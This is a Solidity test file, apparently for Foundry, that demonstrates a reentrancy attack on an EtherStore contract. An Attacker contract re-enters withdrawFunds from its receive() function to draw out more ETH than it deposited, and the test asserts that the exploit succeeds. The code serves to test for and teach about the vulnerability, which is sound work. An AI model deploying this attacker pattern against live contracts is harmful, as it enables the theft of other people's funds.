
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {EtherStore} from "../src/EtherStore.sol";

contract TestReentrancyEtherStore is Test {
    EtherStore public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new EtherStore();
        _attacker = new Attacker(address(_contractUnderTest));
        
        // Advance time to satisfy the '1 weeks' constraint in withdrawFunds
        // Initial lastWithdrawTime is 0, so we need block.timestamp >= 1 weeks.
        vm.warp(block.timestamp + 2 weeks);
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // Constrain attackVal to be within the withdrawal limit (1 ether) and non-zero
        vm.assume(attackVal > 0.01 ether && attackVal <= 1 ether);

        // Fund the Victim with extra ETH so it can be drained beyond the attacker's deposit
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        // Fund the Attacker so it can deposit
        vm.deal(address(_attacker), attackVal);

        // Fund the Test Contract to pass value to setupAttack
        vm.deal(address(this), attackVal);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    EtherStore public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = EtherStore(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds to establish a balance in the victim contract
        _victim.depositFunds{value: val}();
    }

    function attack(uint256 val) public {
        // Call the vulnerable function
        _victim.withdrawFunds(val);

        // If reentrancy occurred, attackCallCount will be >= 2
        if (attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        // Limit recursion to 1 re-entrant call to prove vulnerability without running out of gas
        if (attackCallCount < 2) {            
            _victim.withdrawFunds(storedAttackVal);
        }
    }
}
